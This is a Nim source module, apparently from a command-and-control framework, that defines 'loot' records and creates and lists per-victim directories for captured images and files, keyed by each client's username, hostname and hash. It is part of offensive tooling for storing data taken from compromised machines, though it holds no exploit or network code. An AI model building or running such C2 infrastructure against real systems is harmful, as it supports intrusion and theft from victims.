import os, strformat
import types

type 
  LootType* = enum
    LootImage = "image", LootFile = "file"

type
  Loot* = ref object
    client*: C2Client
    t*: LootType
    file*: string
    data*: string

proc getLootDirectory*(client: C2Client): string = 
  result = fmt"loot/{client.username}@{client.hostname} ({client.hash[0 .. 4]})"

proc createLootDirectories*(client: C2Client) =
  let rootDirectory = getLootDirectory client
  createDir rootDirectory
  createDir rootDirectory & "/images/"
  createDir rootDirectory & "/files/"

proc getLoot*(client: C2Client): seq[Loot] = 
  let rootDirectory = getLootDirectory client
  for file in walkDir(rootDirectory & "/images"):
    if file.kind == pcFile:
      result.add Loot(
        t: LootImage,
        file: file.path,
        client: client
      )
  for file in walkDir(rootDirectory & "/files"):
    if file.kind == pcFile:
      result.add Loot(
        t: LootFile,
        file: file.path,
        client: client
      )